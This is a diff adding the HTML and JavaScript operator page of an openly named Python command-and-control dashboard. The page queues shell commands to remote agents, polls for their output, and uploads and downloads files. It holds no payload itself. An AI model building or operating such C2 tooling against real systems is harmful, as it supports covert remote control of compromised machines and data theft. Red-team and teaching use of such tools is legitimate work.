@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Python C2 Dashboard</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        background-color: #111;
+        color: #eee;
+        padding: 20px;
+      }
+      textarea {
+        width: 100%;
+        height: 200px;
+        background: #222;
+        color: #0f0;
+        font-family: monospace;
+        padding: 10px;
+      }
+      input,
+      button {
+        margin: 10px 0;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Python C2 WebUI</h1>
+
+    <h3>Send Command</h3>
+    <input
+      type="text"
+      id="commandInput"
+      placeholder="e.g. ls or download file.txt"
+      size="50"
+    />
+    <button onclick="sendCommand()">Send</button>
+
+    <h3>Command Output</h3>
+    <textarea id="output" readonly></textarea>
+
+    <h3>Upload File</h3>
+    <input type="file" id="fileInput" />
+    <button onclick="uploadFile()">Upload</button>
+
+    <h3>Download File</h3>
+    <input type="text" id="downloadFileName" placeholder="filename.txt" />
+    <button onclick="downloadFile()">Download</button>
+
+    <script>
+      function sendCommand() {
+        const command = document.getElementById("commandInput").value;
+        fetch("/send_command", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ command }),
+        })
+          .then((res) => res.json())
+          .then((data) => appendOutput(`> ${command}\n[queued]`));
+      }
+
+      function pollResponse() {
+        fetch("/get_response")
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.response) {
+              appendOutput(data.response);
+            }
+          })
+          .catch((err) => console.error(err));
+      }
+
+      function appendOutput(text) {
+        const output = document.getElementById("output");
+        output.value += text + "\n";
+        output.scrollTop = output.scrollHeight;
+      }
+
+      function uploadFile() {
+        const file = document.getElementById("fileInput").files[0];
+        if (!file) return alert("Choose a file first.");
+        const formData = new FormData();
+        formData.append("file", file);
+
+        fetch("/upload", {
+          method: "POST",
+          body: formData,
+        })
+          .then((res) => res.json())
+          .then((data) => appendOutput(`[upload] ${data.filename}`));
+      }
+
+      function downloadFile() {
+        const filename = document.getElementById("downloadFileName").value;
+        if (!filename) return alert("Enter a filename to download.");
+        window.open(`/download/${filename}`, "_blank");
+      }
+
+      // Poll for output every 2 seconds
+      setInterval(pollResponse, 2000);
+    </script>
+  </body>
+</html>
